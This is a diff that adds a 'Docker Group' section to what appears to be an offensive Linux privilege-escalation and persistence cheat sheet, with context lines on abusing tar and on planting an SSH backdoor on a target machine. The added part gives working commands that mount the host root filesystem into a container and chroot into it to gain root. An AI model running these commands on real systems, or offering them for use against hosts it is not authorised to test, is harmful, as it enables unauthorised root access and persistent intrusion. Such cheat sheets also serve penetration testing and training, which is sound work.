@@ -229,6 +229,16 @@ This can be easily abused in programs like tar to privilege escalate.
 
 Taken from https://www.exploit-db.com/papers/33930
 
+### Docker Group
+If the current user is part of the docker group, it can lead to easy privilege escalation since docker has full kernal access due to its nature.
+
+```bash
+#List images to use one
+docker images
+#Run the image mounting the host disk and chroot on it
+docker run -it -v /:/host/ alpine chroot /host/ bash
+```
+
 ## Persistence
 ### SSH
 You can create a SSH backdoor to gain persistence on the target machine. First, generate a keypair using the following command, on either the target machine or attacker machine
